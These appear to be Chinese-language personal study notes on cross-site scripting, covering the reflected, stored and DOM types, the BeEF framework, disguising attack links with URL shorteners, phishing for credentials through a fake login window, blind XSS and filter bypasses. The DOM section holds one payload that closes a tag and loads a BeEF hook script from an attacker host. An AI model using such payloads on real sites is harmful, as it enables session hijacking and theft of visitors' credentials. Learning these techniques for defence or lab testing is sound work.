# xss跨站脚本攻击

## xss分类

```
反射性：
与客户端交互，交互的数据不会被存在数据库中，一次性，一般出现在查询类界面。
存储型：
交互的数据被存在数据库中，永久性存储，留言板，注册等页面。
DOM型：
不与服务器进行交互，是一种通过DOM操作
```





## 反射型xss攻击（中低危）

![image-20240710151310098](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240710151310098.png)

查询框

使用beef-xss工具

将payload输入到输入框中

获取url,使用在线平台生成短网址

受害者访问后将获取受害者信息



![image-20240710152632048](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240710152632048.png)



## 存储型xss攻击（中高危）

![image-20240710153249909](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240710153249909.png)

留言板

将payload输入提交后每次访问该页面都将触发payload



## DOM型xss攻击

### 可能触发DOM型xss的js操作

```javascript
document.referer
window.name
location			url相关操作
innerHTML			给标签内部添加内容
documen.write
```





![image-20240710154051610](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240710154051610.png)

将我们输入的字符给到<a>标签

```
<a href="https://baidu.com" _msttexthash="27140139" _msthash="87">你看到了什么？</a>

尝试闭合<a>标签

构造payload
xx'>xxx</a><script src="http://192.168.137.130:3000/hook.js"></script>

```









## xss钓鱼用户名密码

构造脚本完成登录窗口



![image-20240710162456376](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240710162456376.png)

受害者登陆后将获取的用户名密码保存到攻击者服务器









## xss盲打

前端注入无回显，不知道是否成功

受害者查看数据后被攻击



## xss绕过

```
前端绕过：抓包通过工具发送请求绕过前端验证

后端验证：双写绕过，大小写绕过


```











































